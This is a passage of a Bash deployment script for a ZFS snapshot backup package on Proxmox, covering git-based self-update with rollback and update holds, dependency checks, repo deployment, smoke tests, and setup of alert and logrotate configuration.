# so this is not a symlink-following hazard the way read/write are. It still
# refuses, on purpose: a state file that has been swapped for a symlink is
# evidence of tampering, and papering over it by silently removing the link
# would hide that from the operator.
remove_state_file() {
    local dst="$1"
    if [ -L "$dst" ]; then
        warn "$dst is a symlink, not the state file this script wrote -- refusing to remove it automatically. Inspect and remove by hand: ls -la $dst"
        return 1
    fi
    [ -e "$dst" ] || return 0
    rm -f "$dst" 2>/dev/null
}

# The ultimate fallback if this script itself is what a bad update broke:
#   git -C <repo> reset --hard <sha>   and remove the cron line by hand.
# Everything below is convenience on top of that, which is why rollback stays
# two plain git commands rather than anything clever.
do_self_update() {
    [ -d "$REPO_DIR/.git" ] || die "no git checkout at $REPO_DIR"
    ensure_update_state_dir || { warn "refusing to update: $UPDATE_STATE_DIR is not safe to use as update-control state"; return 1; }

    if [ -L "$UPDATE_HOLD_FILE" ]; then
        warn "$UPDATE_HOLD_FILE is a symlink -- treating update-control state as tampered with, refusing to update. Resolve by hand: ls -la $UPDATE_HOLD_FILE"
        return 1
    fi
    if [ -e "$UPDATE_HOLD_FILE" ]; then
        log "updates are HELD ($(read_state_file "$UPDATE_HOLD_FILE")) -- not updating. Resume with: bash $REPO_DIR/deploy.sh --resume-updates"
        return 0
    fi
    if [ -L "$PREV_REV_FILE" ]; then
        warn "$PREV_REV_FILE is a symlink -- treating update-control state as tampered with, refusing to update. Resolve by hand: ls -la $PREV_REV_FILE"
        return 1
    fi

    git -C "$REPO_DIR" fetch --quiet origin main 2>/dev/null         || { warn "fetch failed -- leaving $REPO_DIR on its current revision"; return 1; }

    local current target
    current=$(git -C "$REPO_DIR" rev-parse HEAD) || return 1
    target=$(git -C "$REPO_DIR" rev-parse FETCH_HEAD) || return 1

    # F3: a dirty worktree must not be fast-forwarded. `--ff-only` succeeds
    # even with an unrelated local edit in play, and the host then runs a mix
    # of the reviewed target revision and whatever that local edit was.
    local dirty
    dirty=$(git -C "$REPO_DIR" status --porcelain 2>&1)

    # The whole point of the F1 (REV-20260729-003) finding: a no-op run must
    # not consume the rollback point. Nothing changed, so nothing is recorded
    # -- and since nothing is recorded, a dirty tree here is worth a warning,
    # not a failure (acceptance criterion: report, don't overwrite state).
    if [ "$current" = "$target" ]; then
        [ -n "$dirty" ] && warn "$REPO_DIR has uncommitted changes -- nothing to update, but this is worth a look: git -C $REPO_DIR status"
        log "already at $(printf '%.8s' "$current") -- nothing to update"
        return 0
    fi

    if [ -n "$dirty" ]; then
        warn "$REPO_DIR is not clean -- refusing to update to $(printf '%.8s' "$target"). Running a mix of reviewed and unreviewed local code as root is exactly what this check exists to prevent. Resolve by hand: git -C $REPO_DIR status"
        return 1
    fi

    # Recorded BEFORE the new revision is activated, and restored if activating
    # it fails, so a failed update never eats the rollback point either. F2:
    # if this durable record cannot be written, B is never activated -- a
    # rollback point that might not exist is worse than not updating at all.
    local prior=""
    if [ -e "$PREV_REV_FILE" ]; then
        prior=$(read_state_file "$PREV_REV_FILE") || { warn "could not read $PREV_REV_FILE -- refusing to update with an unreadable rollback point"; return 1; }
    fi
    write_state_file "$PREV_REV_FILE" "$current"         || { warn "could not durably record $current at $PREV_REV_FILE -- refusing to activate $(printf '%.8s' "$target") without a working rollback point"; return 1; }

    if ! git -C "$REPO_DIR" merge --ff-only "$target" >/dev/null 2>&1; then
        # Best-effort restoration of the pointer this function itself just
        # overwrote. If THAT also fails, the state is genuinely uncertain --
        # the safe response is an automatic hold, not silent hourly retries.
        local _restore_ok=1
        if [ -n "$prior" ]; then
            write_state_file "$PREV_REV_FILE" "$prior" || _restore_ok=0
        else
            remove_state_file "$PREV_REV_FILE" || _restore_ok=0
        fi
        if [ "$_restore_ok" -eq 0 ]; then
            warn "fast-forward to $(printf '%.8s' "$target") failed AND the rollback pointer at $PREV_REV_FILE could not be restored -- state is uncertain, holding automatic updates"
            write_state_file "$UPDATE_HOLD_FILE" "held automatically: rollback-pointer restore failed after a bad fast-forward on $(date '+%Y-%m-%d %H:%M:%S')"                 || warn "could not even record an automatic hold -- $UPDATE_STATE_DIR needs manual attention before the next hourly run"
        fi
        warn "fast-forward to $(printf '%.8s' "$target") failed -- still on $(printf '%.8s' "$current"). Local modifications in $REPO_DIR are the usual cause: git -C $REPO_DIR status"
        return 1
    fi
    log "updated $(printf '%.8s' "$current") -> $(printf '%.8s' "$target") (rollback point recorded)"
    return 0
}

do_rollback() {
    [ -d "$REPO_DIR/.git" ] || die "no git checkout at $REPO_DIR"
    ensure_update_state_dir || die "$UPDATE_STATE_DIR is not safe to use as update-control state -- see above"
    local target
    target=$(read_state_file "$PREV_REV_FILE") || die "no previous revision recorded at $PREV_REV_FILE (or it is not a plain file) -- nothing to roll back to. Pick a revision by hand: git -C $REPO_DIR log --oneline"
    [ -n "$target" ] || die "$PREV_REV_FILE is empty -- nothing to roll back to"
    local from
    from=$(git -C "$REPO_DIR" rev-parse HEAD) || die "cannot resolve current HEAD in $REPO_DIR"
    git -C "$REPO_DIR" cat-file -e "${target}^{commit}" 2>/dev/null         || die "recorded revision $target is not in $REPO_DIR -- resolve by hand"

    # F2: the hold is written BEFORE the reset, not after. If the reset then
    # fails partway, the host must come up HELD -- not silently retry the same
    # revision on the next hourly run because nothing ever recorded the
    # attempt. This also satisfies "never report success without a hold": if
    # this write fails, rollback aborts before touching the checkout at all.
    write_state_file "$UPDATE_HOLD_FILE"         "rollback $(printf '%.8s' "$from") -> $(printf '%.8s' "$target") started $(date '+%Y-%m-%d %H:%M:%S')"         || die "could not record an update hold at $UPDATE_HOLD_FILE -- refusing to roll back without one. Fix $UPDATE_STATE_DIR and retry."

    if ! git -C "$REPO_DIR" reset --hard "$target" >/dev/null 2>&1; then
        write_state_file "$UPDATE_HOLD_FILE"             "rollback to $(printf '%.8s' "$target") FAILED at $(date '+%Y-%m-%d %H:%M:%S') -- checkout may be inconsistent, held for manual investigation" 2>/dev/null
        die "git reset --hard $target failed -- automatic updates remain HELD, investigate $REPO_DIR by hand"
    fi

    write_state_file "$UPDATE_HOLD_FILE"         "rolled back from $(printf '%.8s' "$from") to $(printf '%.8s' "$target") on $(date '+%Y-%m-%d %H:%M:%S')"         || warn "rollback succeeded but could not refresh the hold message at $UPDATE_HOLD_FILE (the hold from before the reset is still in place)"

    log "rolled back $(printf '%.8s' "$from") -> $(printf '%.8s' "$target")"
    log "AUTOMATIC UPDATES ARE NOW HELD -- without this the next hourly run would pull the same revision straight back."
    log "When the fix is on main:  bash $REPO_DIR/deploy.sh --resume-updates"
    return 0
}

do_resume_updates() {
    ensure_update_state_dir || die "$UPDATE_STATE_DIR is not safe to use as update-control state -- see above"
    if [ -L "$UPDATE_HOLD_FILE" ]; then
        die "$UPDATE_HOLD_FILE is a symlink -- refusing to touch it. Resolve by hand: ls -la $UPDATE_HOLD_FILE"
    fi

    local had_hold=0 hold_content=""
    if [ -e "$UPDATE_HOLD_FILE" ]; then
        had_hold=1
        hold_content=$(read_state_file "$UPDATE_HOLD_FILE")
        log "removing update hold ($hold_content)"
        remove_state_file "$UPDATE_HOLD_FILE" || die "could not remove $UPDATE_HOLD_FILE -- hold left in place, refusing to update"
        [ -e "$UPDATE_HOLD_FILE" ] && die "removal of $UPDATE_HOLD_FILE did not take effect -- hold left in place, refusing to update"
    else
        log "no update hold in place -- nothing to resume"
    fi

    do_self_update
    local rc=$?
    # F2: an explicit --resume-updates that turns around and fails must not
    # leave the host silently eligible for hourly retries -- restore the hold
    # rather than defaulting open.
    if [ "$rc" -ne 0 ] && [ "$had_hold" -eq 1 ]; then
        warn "the explicit update after --resume-updates failed -- restoring the hold rather than leaving automatic updates enabled"
        write_state_file "$UPDATE_HOLD_FILE"             "restored after a failed --resume-updates on $(date '+%Y-%m-%d %H:%M:%S') -- previous hold was: $hold_content"             || warn "could not restore the hold at $UPDATE_HOLD_FILE either -- automatic updates may retry hourly. Investigate $UPDATE_STATE_DIR by hand."
    fi
    return "$rc"
}

# The update path, not a deployment. Dispatched BEFORE the root check and before
# every phase (apt, cron, alerting): cron runs the first one hourly, and a
# rollback has to work when the thing being rolled back is what broke.
#
# No id check here on purpose. What actually protects these is the filesystem --
# $REPO_DIR is root-owned, so a non-root caller cannot reset it, and gets a plain
# git error saying so. An id check instead would have made the whole path
# untestable without root, and a test that needs root is a test whose own
# mistakes edit a live host. (The caveat this comment used to name -- the state
# dir being group zfsalert and group-writable -- is REV-20260729-004 F1, fixed
# above: $UPDATE_STATE_DIR is root-private now, separate from the alert dir.)
if [ "$SELF_UPDATE" -eq 1 ]; then do_self_update; exit $?; fi
if [ "$ROLLBACK" -eq 1 ]; then do_rollback; exit $?; fi
if [ "$RESUME_UPDATES" -eq 1 ]; then do_resume_updates; exit $?; fi

[ "$(id -u)" -eq 0 ] || die "run as root"

[ "$CHECK_ONLY" -eq 1 ] && log "CHECK-ONLY mode: nothing will be installed or modified"

# On Proxmox, apt-get update commonly fails on the pve-enterprise repo (401,
# no subscription) even though the other repos succeed. Try a plain install
# first (works if package lists are already cached); only fall back to
# `apt-get update` (tolerating the enterprise-repo failure) if that doesn't
# work. Shared by every package we need below.
apt_install_with_fallback() {
    local pkg="$1"
    apt-get install -y "$pkg" 2>/dev/null && return 0
    warn "plain install of $pkg failed, running apt-get update first (pve-enterprise 401 is expected/harmless here)"
    apt-get update || true
    apt-get install -y "$pkg"
}

# ------------------------------------------------------------------------------
log "Phase 1: dependencies"
# ------------------------------------------------------------------------------
# The list below is derived from what the package's scripts ACTUALLY invoke, not
# from memory -- re-derive it with:
#   grep -ohE '\b(zfs|mbuffer|pigz|zstd|ssh|flock|mail|hostname|md5sum)\b' *.sh | sort -u
# and keep this table in step. Severity decides what a miss costs:
#
#   required     -- the package cannot work at all; missing => FATAL
#   compression  -- only jobs using -z/-Z/-g need it, but -z is on almost every
#                   real cron line, so treat a miss as loud
#   optional     -- degrades a feature, not the core; missing => warning
#
MISSING_OPTIONAL=""

# check_dep <command> <apt-package> <severity> <why>
check_dep() {
    local cmd="$1" pkg="$2" sev="$3" why="$4"

    if command -v "$cmd" >/dev/null 2>&1; then
        log "  [ok]      $cmd ($why)"
        return 0
    fi

    if [ "$CHECK_ONLY" -eq 1 ]; then
        case "$sev" in
            required) warn "  [MISSING] $cmd (apt: $pkg) -- REQUIRED: $why" ;;
            *)        warn "  [missing] $cmd (apt: $pkg) -- $why" ;;
        esac
        MISSING_OPTIONAL="$MISSING_OPTIONAL $cmd"
        return 1
    fi

    log "  [missing]  $cmd -- installing '$pkg' ($why)"
    apt_install_with_fallback "$pkg" >/dev/null 2>&1 || true

    if command -v "$cmd" >/dev/null 2>&1; then
        log "  [installed] $cmd"
        return 0
    fi

    case "$sev" in
        required)
            die "$cmd is REQUIRED and could not be installed from '$pkg' -- $why"
            ;;
        compression)
            warn "$cmd could not be installed from '$pkg' -- $why"
            MISSING_OPTIONAL="$MISSING_OPTIONAL $cmd"
            ;;
        *)
            warn "$cmd not available ('$pkg') -- $why"
            MISSING_OPTIONAL="$MISSING_OPTIONAL $cmd"
            ;;
    esac
    return 1
}

check_dep git      git              required    "cloning and auto-updating this repo"
check_dep flock    util-linux       required    "single-instance locking in all send/prune scripts"
check_dep mbuffer  mbuffer          required    "snapsend.sh/snapget.sh refuse to start without it, even without -z"
check_dep hostname hostname         required    "validate_remote_host uses 'hostname -f' to refuse loopback replication"
check_dep md5sum   coreutils        required    "per-target bookmark tags (lib-zfs-snap.sh)"
check_dep awk      gawk             required    "snapshot list parsing"

# zstd is the DEFAULT compressor since 2026-07-22 -- it measured better than pigz
# on BOTH ratio and throughput (see the benchmark table in snapsend.sh's header).
# So on a fresh host a missing zstd breaks every ordinary '-z' cron line, which
# is why it is checked BEFORE pigz and treated as loud.
check_dep zstd     zstd             compression "DEFAULT compressor for -z/-Z"
check_dep pigz     pigz             compression "alternative compressor, selected with -g"

check_dep ssh      openssh-client   optional    "remote push/pull; local-only hosts do not need it"
check_dep mail     mailutils        optional    "notify-fail.sh / capacity + staleness alerting"

# ------------------------------------------------------------------------------
log "Part 1b: ZFS itself"
# ------------------------------------------------------------------------------
# Deliberately separate from the table: on a host without ZFS this is not a
# missing utility, it is the wrong host. Installing zfsutils-linux would give a
# working CLI with no pool support, which fails later and much less clearly.
if ! command -v zfs >/dev/null 2>&1 && [ "$CHECK_ONLY" -eq 0 ]; then
    warn "zfs command not found -- attempting zfsutils-linux (expected already present on Proxmox)"
    apt_install_with_fallback zfsutils-linux >/dev/null 2>&1 || true
fi
command -v zfs >/dev/null 2>&1 || die "zfs not available -- this package manages ZFS snapshots and cannot do anything on this host"

# A CLI that cannot reach the kernel module is the failure that actually bites:
# every script would run and report nothing rather than failing loudly.
if ! zfs list -H >/dev/null 2>&1; then
    die "the 'zfs' command exists but 'zfs list' fails -- kernel module not loaded, or no pools imported. Fix that before deploying backups here."
fi
log "  [ok]      zfs $(zfs version 2>/dev/null | head -1 | awk '{print $NF}') -- $(zpool list -H -o name 2>/dev/null | tr '\n' ' ')"

# ------------------------------------------------------------------------------
log "Phase 2: deploy the repo into $REPO_DIR"
# ------------------------------------------------------------------------------
if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ -d "$REPO_DIR/.git" ]; then
        log "checkout present at $REPO_DIR ($(git -C "$REPO_DIR" rev-parse --short HEAD 2>/dev/null))"
        d=$(git -C "$REPO_DIR" status --porcelain 2>/dev/null)
        [ -n "$d" ] && warn "checkout has local modifications -- 'git pull --ff-only' will fail:
$d"
    else
        warn "no git checkout at $REPO_DIR -- run without --check-only to create it"
    fi
else

mkdir -p "$(dirname "$REPO_DIR")"

if [ -d "$REPO_DIR/.git" ]; then
    log "$REPO_DIR is already a git repo, pulling..."
    git -C "$REPO_DIR" remote get-url origin 2>/dev/null | grep -qF "$REPO_URL" \
        || warn "existing repo's origin does not match $REPO_URL -- check manually"
    git -C "$REPO_DIR" pull --ff-only origin main \
        || die "git pull --ff-only failed -- local repo has diverged, resolve manually before continuing"

elif [ -d "$REPO_DIR" ] && [ -n "$(ls -A "$REPO_DIR" 2>/dev/null)" ]; then
    log "$REPO_DIR exists with files but is not a git repo (plain scripts from an earlier manual copy?)"
    log "Backing up any of the 3 tracked scripts that would collide with the checkout..."
    BACKUP_DIR="${REPO_DIR}.bak-preGit-$(date +%Y%m%d%H%M%S)"
    mkdir -p "$BACKUP_DIR"
    for f in snapsend.sh snapget.sh delsnaps.sh; do
        if [ -e "$REPO_DIR/$f" ]; then
            mv "$REPO_DIR/$f" "$BACKUP_DIR/"
            log "  moved $f -> $BACKUP_DIR/"
        fi
    done

    ( cd "$REPO_DIR" \
      && git init \
      && git remote add origin "$REPO_URL" \
      && git fetch origin \
      && git checkout -b main --track origin/main ) \
      || die "git init/checkout failed"

    log "Diff against backup (should be empty besides new .git/.gitignore/.gitattributes):"
    diff -rq "$BACKUP_DIR" "$REPO_DIR" 2>&1 | grep -v "^Only in $REPO_DIR:" || true

else
    log "$REPO_DIR does not exist or is empty -- plain clone"
    git clone "$REPO_URL" "$REPO_DIR" || die "git clone failed"
fi

fi   # end of CHECK_ONLY guard for Part 2

# ------------------------------------------------------------------------------
log "Phase 6: verify the deployment"
# ------------------------------------------------------------------------------
cd "$REPO_DIR" || die "cannot cd into $REPO_DIR"
log "HEAD: $(git log -1 --oneline)"

FAIL=0

# lib-zfs-snap.sh is not optional: snapsend/snapget/delsnaps/gen-cron all source
# it and exit immediately if it is missing. Check it FIRST, because without it
# every -V below would fail and the real cause would be buried in the noise.
if [ ! -r lib-zfs-snap.sh ]; then
    die "lib-zfs-snap.sh missing from the checkout -- snapsend/snapget/delsnaps/gen-cron all source it and refuse to start. The clone is incomplete."
fi
log "  lib-zfs-snap.sh present"

# All five executables the package ships, not just the original three: gen-cron.sh
# (crontab generator) and check-snap-age.sh (staleness monitor) are part of the
# package now and are just as easy to get wrong silently.
for f in snapsend.sh snapget.sh delsnaps.sh gen-cron.sh check-snap-age.sh; do
    if [ ! -e "$f" ]; then
        warn "$f is missing from the checkout"
        FAIL=1
        continue
    fi
    if [ ! -x "$f" ]; then
        warn "$f is not executable (fixing with chmod +x)"
        chmod +x "$f"
    fi
    # Syntax check before execution: a truncated or CRLF-mangled file can still
    # be executable, and the failure it produces later is far less obvious.
    bash -n "$f" 2>/dev/null || { warn "$f fails 'bash -n' -- corrupt or wrong line endings?"; FAIL=1; continue; }
    v=$(./"$f" -V 2>&1) || { warn "$f -V failed: $v"; FAIL=1; continue; }
    log "  $f -> $v"
done
[ "$FAIL" -eq 0 ] || warn "one or more scripts failed the smoke test -- investigate before relying on cron"

# Prove the compressor actually round-trips ON THIS HOST rather than trusting
# that the binary being present means it works. Cheap, and catches a broken or
# shimmed install before a real transfer does.
for c in zstd pigz; do
    command -v "$c" >/dev/null 2>&1 || continue
    case "$c" in
        zstd) probe="zstd -T0 -3 -c" ; unprobe="zstd -d -c" ;;
        pigz) probe="pigz -6"        ; unprobe="pigz -d"    ;;
    esac
    if [ "$(echo zfs-snapshot-all | $probe | $unprobe 2>/dev/null)" = "zfs-snapshot-all" ]; then
        log "  $c round-trip ok"
    else
        warn "$c is installed but failed a compress/decompress round-trip -- jobs using it will break"
        FAIL=1
    fi
done

# ------------------------------------------------------------------------------
log "Phase 4: notify-fail.sh (alert reporting)"
# ------------------------------------------------------------------------------
# Shared alerting state, deliberately OUTSIDE /root. /root is 0700, so a
# delegated non-root service account (phase 8) cannot reach
# anything under it -- not the queue, not the config, not the notify scripts.
# The tempting shortcut, opening /root/scripts to a group, is a privilege
# escalation: that directory holds scripts root executes from cron, so a
# service account able to write there could replace them. Hence a separate
# group-writable directory that contains only data.
ALERT_GROUP="zfsalert"
if [ "$CHECK_ONLY" -eq 1 ]; then
    getent group "$ALERT_GROUP" >/dev/null || warn "  group $ALERT_GROUP missing -- a delegated account could not queue alerts"
    if [ -d "$ALERT_SHARED_DIR" ]; then
        log "  $ALERT_SHARED_DIR present ($(stat -c '%a %U:%G' "$ALERT_SHARED_DIR"))"
    else
        warn "  $ALERT_SHARED_DIR missing -- alert queue would fall back to a root-only path"
    fi
else
    getent group "$ALERT_GROUP" >/dev/null || { groupadd --system "$ALERT_GROUP" && log "created group $ALERT_GROUP"; }
    mkdir -p "$ALERT_SHARED_DIR/notify-state"
    chgrp -R "$ALERT_GROUP" "$ALERT_SHARED_DIR"
    # 2775: setgid, so every file created here inherits the group and stays
    # writable by the other account no matter which one created it.
    chmod 2775 "$ALERT_SHARED_DIR" "$ALERT_SHARED_DIR/notify-state"
    log "shared alert dir $ALERT_SHARED_DIR (2775 root:$ALERT_GROUP)"
fi

# ------------------------------------------------------------------------------
log "Phase 4b: update-control state (rollback bookkeeping, root-private)"
# ------------------------------------------------------------------------------
# Deliberately NOT inside $ALERT_SHARED_DIR (REV-20260729-004 F1): that
# directory is 2775 root:$ALERT_GROUP on purpose so the delegated account above
# can queue alert data, and group-write on the directory would also let it
# remove or replace previous-revision/update-hold -- undoing an administrator's
# rollback. This lives under /root instead, for the same reason notify-fail's
# own scripts do (see the note at the top of Phase 4).
if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ -L "$UPDATE_STATE_DIR" ]; then
        warn "  $UPDATE_STATE_DIR is a symlink -- --self-update/--rollback/--resume-updates would all refuse to run"
    elif [ -d "$UPDATE_STATE_DIR" ]; then
        _mode=$(stat -c '%a' "$UPDATE_STATE_DIR" 2>/dev/null)
        log "  $UPDATE_STATE_DIR present ($(stat -c '%a %U:%G' "$UPDATE_STATE_DIR" 2>/dev/null))"
        if [ -n "$_mode" ] && [ $(( 0${_mode} & 0022 )) -ne 0 ]; then
            warn "  $UPDATE_STATE_DIR is group- or world-writable (mode $_mode) -- a delegated account could tamper with rollback state"
        fi
    else
        log "  $UPDATE_STATE_DIR not created yet -- the first --self-update/--rollback creates it 0700 root:root"
    fi
else
    # One-time migration: earlier deploys defaulted this to $ALERT_SHARED_DIR
    # (F1). A host that already recorded a rollback point, or worse is
    # currently HELD after a real --rollback, must not silently lose that just
    # because this fix moved the default elsewhere -- that would either strand
    # an operator's hold-removal instructions or (for previous-revision) quietly
    # discard a working rollback point with no warning.
    if [ "$ALERT_SHARED_DIR" != "$UPDATE_STATE_DIR" ]; then
        for _f in previous-revision update-hold; do
            _old="$ALERT_SHARED_DIR/$_f"
            _new="$UPDATE_STATE_DIR/$_f"
            if [ -f "$_old" ] && [ ! -L "$_old" ] && [ ! -e "$_new" ]; then
                if ensure_update_state_dir && mv -n "$_old" "$_new" 2>/dev/null; then
                    log "migrated $_old -> $_new (REV-20260729-004 F1: update-control state is no longer inside the group-writable alert dir)"
                else
                    warn "could not migrate $_old to $_new -- check by hand, a rollback point or hold may be stranded"
                fi
            fi
        done
    fi
    ensure_update_state_dir         && log "update-control state dir $UPDATE_STATE_DIR ($(stat -c '%a %U:%G' "$UPDATE_STATE_DIR" 2>/dev/null))"         || warn "  could not prepare $UPDATE_STATE_DIR as a safe, root-private directory -- --self-update/--rollback/--resume-updates will all refuse to run until this is fixed by hand"
fi

ALERT_CONF="/etc/zfs-alert.conf"
OLD_ALERT_CONF="/root/scripts/zfs-alert.conf"
OLD_QUEUE="/root/scripts/alert-queue.log"
if [ "$CHECK_ONLY" -eq 0 ]; then
    # Migrate a host that was set up before the split. Move, don't copy: two
    # readable configs would be two sources of truth, and the scripts prefer
    # /etc, so a stale /root copy would silently do nothing while looking live.
    if [ -f "$OLD_ALERT_CONF" ] && [ ! -f "$ALERT_CONF" ]; then
        sed -e "s#^ZFS_ALERT_QUEUE=.*#ZFS_ALERT_QUEUE=$ALERT_SHARED_DIR/alert-queue.log#" \
            -e "s#^ZFS_ALERT_STATE_DIR=.*#ZFS_ALERT_STATE_DIR=$ALERT_SHARED_DIR/notify-state#" \
            "$OLD_ALERT_CONF" > "$ALERT_CONF" && rm -f "$OLD_ALERT_CONF"
        chmod 0644 "$ALERT_CONF"
        log "migrated $OLD_ALERT_CONF -> $ALERT_CONF (queue/state repointed at $ALERT_SHARED_DIR)"
    fi
    # Anything already queued must ride along, or the next digest reports a
    # quiet day that was not quiet.
    if [ -s "$OLD_QUEUE" ]; then
        cat "$OLD_QUEUE" >> "$ALERT_SHARED_DIR/alert-queue.log" && rm -f "$OLD_QUEUE"
        chgrp "$ALERT_GROUP" "$ALERT_SHARED_DIR/alert-queue.log" 2>/dev/null
        chmod 0664 "$ALERT_SHARED_DIR/alert-queue.log" 2>/dev/null
        log "migrated queued findings from $OLD_QUEUE"
    fi
    # An existing queue may predate the umask fix and be 0644, which locks out
    # whichever account did not happen to create it. Cheap to correct every run.
    if [ -f "$ALERT_SHARED_DIR/alert-queue.log" ]; then
        chgrp "$ALERT_GROUP" "$ALERT_SHARED_DIR/alert-queue.log" 2>/dev/null
        chmod 0664 "$ALERT_SHARED_DIR/alert-queue.log" 2>/dev/null
    fi
fi

if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ -r "$ALERT_CONF" ]; then
        log "  $ALERT_CONF present (mode: $(sed -n 's/^ZFS_ALERT_MODE=\([a-z]*\).*/\1/p' "$ALERT_CONF" | head -1))"
    else
        warn "  $ALERT_CONF missing -- alerting falls back to built-in defaults (daily)"
    fi
elif [ -e "$ALERT_CONF" ]; then
    log "$ALERT_CONF exists -- NOT overwritten (it is yours to edit; current mode: $(sed -n 's/^ZFS_ALERT_MODE=\([a-z]*\).*/\1/p' "$ALERT_CONF" | head -1))"
else
    FIRST_TIME_SETUP=1
    cat > "$ALERT_CONF" <<EOF
# zfs-alert.conf -- how this host reports backup problems.
# Sourced by notify-fail.sh, notify-warn.sh and alert-digest.sh. Plain shell:
# VAR=value, no spaces around '='. Re-running deploy.sh never
# overwrites this file, so local changes survive an upgrade.
#
# ---------------------------------------------------------------------------
#  ZFS_ALERT_MODE   daily | immediate      <-- THE ONE TO CHANGE
# ---------------------------------------------------------------------------
#   daily      (default) findings are queued and alert-digest.sh sends exactly
#              ONE mail per host per day, covering alerts and warnings
#              together. A day with nothing to report sends no mail at all.
#              Chosen because at fleet scale a mail per finding is a stream the
#              operator starts filtering away.
#
#   immediate  every ALERT mails the moment it happens. SET THIS WHILE BRINGING
#              A HOST UP: a job you misconfigured today is a five-minute fix if
#              you hear about it within the hour, and a lost night of backups if
#              you read about it in tomorrow's digest. Switch back to daily once
#              the host has run clean for a few days.
#              Known cost, and the reason daily is the default: the rate limit
#              is per MESSAGE, so two different jobs failing in the same cron
#              tick send two separate mails at the same second.
#
# In immediate mode a finding is NOT also queued, so it is never reported twice.
ZFS_ALERT_MODE=${ALERT_MODE}

# Same choice for WARNING-tier findings ("getting stale", not yet critical).
# Leave on daily unless you have a specific reason: warnings are by definition
# the ones that are not urgent, and making them immediate is how an inbox that
# gets read turns into one that gets filtered.
ZFS_WARN_MODE=daily

# Where alerts go. Changing it here changes it for all three scripts at once.
ZFS_ALERT_EMAIL=${NOTIFY_EMAIL}

# Immediate mode only: seconds before the SAME message may mail again.
# Ignored entirely in daily mode (the digest de-duplicates by counting instead).
ZFS_ALERT_COOLDOWN=14400

# Immediate mode only: where the per-message cooldown timestamps live.
ZFS_ALERT_STATE_DIR=${ALERT_SHARED_DIR}/notify-state

# Queue file used by daily mode. The digest consumes it and deletes it; if mail
# delivery fails the findings are put back rather than dropped.
ZFS_ALERT_QUEUE=${ALERT_SHARED_DIR}/alert-queue.log

# When the daily mail goes out. This is the cron SCHEDULE, so it lives in the
# crontab, not here -- gen-cron.sh emits it (DIGEST_SCHEDULE, default 0 7 * * *).
EOF
    chmod 0644 "$ALERT_CONF"
    log "created $ALERT_CONF (ZFS_ALERT_MODE=$ALERT_MODE)"
fi

LOGROTATE_CONF="/etc/logrotate.d/zfs-snapshot-all"
LOGROTATE_MARKER="# zfs-snapshot-all logrotate v1"
if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ -f "$LOGROTATE_CONF" ]; then log "  $LOGROTATE_CONF present"; else warn "  $LOGROTATE_CONF missing -- cron.log grows without bound"; fi
elif [ -e "$LOGROTATE_CONF" ] && grep -qF "$LOGROTATE_MARKER" "$LOGROTATE_CONF" 2>/dev/null; then
    log "$LOGROTATE_CONF already current, leaving it alone"
else
    # Measured before writing this: ~0.1 MB/day, i.e. 4-56 MB after 200-500 days,
    # and ZFS compresses that ~11x on disk. So rotation is for bounded worst case
    # and quick greps, NOT for space -- and retention stays LONG on purpose,
    # because diagnosing a backup problem means comparing runs weeks apart.
    #
    # The file list is explicit, never /root/scripts/*.log: alert-queue.log and
    # warn-queue.log live there too and are STATE, not logs. Rotating them would
    # move the queue out from under alert-digest.sh and silently discard every
    # finding waiting to be mailed.
    #
    # No copytruncate: each cron line opens its log fresh via 2>>, so a plain
    # rename is safe -- a job running across the rotation just finishes writing
    # into the .1 file. copytruncate would be strictly worse here, since it can
    # lose whatever is written during the copy window.
    cat > "$LOGROTATE_CONF" <<EOF
$LOGROTATE_MARKER -- managed by deploy.sh, re-run it to update.
# Deliberately NOT a *.log glob: the alert queue lives in the same directory and
# is state, not a log -- rotating it would throw away queued findings.
/root/scripts/cron.log
/root/scripts/git-pull.log
/root/scripts/zfs-snapshot-stats.log
{
    monthly
    rotate 24
    maxsize 50M
    compress
    delaycompress
    notifempty
    missingok
    create 0644 root root
}
EOF
    chmod 0644 "$LOGROTATE_CONF"
    log "created $LOGROTATE_CONF (monthly, keep 24, compressed)"
fi

if [ "$CHECK_ONLY" -eq 0 ] && command -v logrotate >/dev/null; then
    logrotate --debug "$LOGROTATE_CONF" >/dev/null 2>&1 \
        && log "  logrotate config parses cleanly" \
        || warn "  logrotate rejected $LOGROTATE_CONF -- check it by hand"
fi

NOTIFY_SCRIPT="/root/scripts/notify-fail.sh"
NOTIFY_SCRIPT_MARKER="# notify-fail.sh v9"   # bump this comment when the heredoc body below changes
if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ ! -x "$NOTIFY_SCRIPT" ]; then
        warn "  $NOTIFY_SCRIPT missing -- job failures would be silent"
    elif grep -qF "$NOTIFY_SCRIPT_MARKER" "$NOTIFY_SCRIPT" 2>/dev/null; then
        log "  $NOTIFY_SCRIPT present (current)"
    else
        warn "  $NOTIFY_SCRIPT present but outdated (wrong queue path, or mails immediately) -- re-run without --check-only to upgrade"
    fi
elif [ -e "$NOTIFY_SCRIPT" ] && grep -qF "$NOTIFY_SCRIPT_MARKER" "$NOTIFY_SCRIPT" 2>/dev/null; then
    log "$NOTIFY_SCRIPT already current, leaving it alone"
else
    [ -e "$NOTIFY_SCRIPT" ] && log "$NOTIFY_SCRIPT exists but predates v4 -- upgrading (no more immediate mail; queues into the daily digest)"
    cat > "$NOTIFY_SCRIPT" <<EOF
#!/bin/bash
$NOTIFY_SCRIPT_MARKER -- reports an ALERT-tier finding: a cron job that returned
# non-zero, a CRITICAL/UNKNOWN staleness result, or a DEGRADED/FAULTED pool.
#
# WHETHER IT MAILS NOW OR WAITS FOR THE DAILY DIGEST IS CONFIGURED, NOT BAKED IN.
# Set ZFS_ALERT_MODE in /root/scripts/zfs-alert.conf:
#   daily      (default) queue it; alert-digest.sh sends one mail a day
#   immediate  mail it right now, rate-limited per message via
#              ZFS_ALERT_COOLDOWN. Recommended while bringing a host up.
# A finding is reported through exactly one of the two paths, never both.
#
# Why daily is the default: the immediate path's cooldown is keyed on the
# MESSAGE, so every distinct finding keeps its own counter and two jobs failing
# in the same cron tick send two mails in the same second. Volume then scales
# with the number of distinct findings rather than with hosts, and an operator
# who filters that away is worse off than one who reads a single daily summary.
#
# Either way Proxmox's own ZED pool-health mail is untouched, so a disk actually
# dropping out still pages immediately through that separate path.
# Usage in cron:
#   ... || /root/scripts/notify-fail.sh "job description" "what it actually said"
#
# The SECOND argument is the finding itself: the failing command's own output, or
# check-snap-age.sh's verdict line carrying the real dataset, age and thresholds.
